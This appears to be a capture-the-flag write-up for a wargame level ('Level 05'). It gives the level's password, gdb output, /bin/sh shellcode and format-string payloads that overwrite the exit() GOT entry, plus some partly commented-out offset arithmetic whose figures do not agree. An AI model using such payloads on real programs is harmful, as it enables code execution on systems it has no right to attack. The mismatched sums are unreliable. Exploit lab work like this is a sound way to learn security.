# Level 05
*password : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN*

## Analyze

```
scp -P 4242 level05@192.168.56.109:level05 binary/
```

```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

<!-- buffer address : 0x0804846e
buffer + 4 address : 0x08048472

shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

```
python -c 'print "\xe0\x97\x04\x08" + " %p" * 10' | ./level05
n 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd5ff 0xffffd5fe (nil) 0xffffffff 0xffffd684 0xf7fdb000 0x80497e0
```
- offset : 10
804 = 2052
8472 = 33906

2052 - 12 - 4 = 2036
33906 - 2052 = 31854

```
$ python -c 'print "\xe0\x97\x04\x08" + "\xd0\xae\xe6\xf7" + "\xc4\x45\xee\xf7" + "\xec\x97\xf8\xf7" + "%2036x" + "%10$hn" + "%31854x" + "%10$hn"' > /tmp/level05
$ cat /tmp/level05 - | ./level05
``` -->

return exit() : 0x080497e0\
```
$ cd /tmp
$ gcc getenv.c
$ cd -
/home/users/level05
$ level05@OverRide:~$ /tmp/a.out
0x7fffffffe813
```

4294961171 - 4 = 4294961167

- FFFF = 65535
- E813 = 59411
59411 - 4 = 59407\
65535 - 59422 = 6113


python -c 'print "\xe0\x97\x04\x08" + "%4294961167x" + "%10$n"' > /tmp/level05
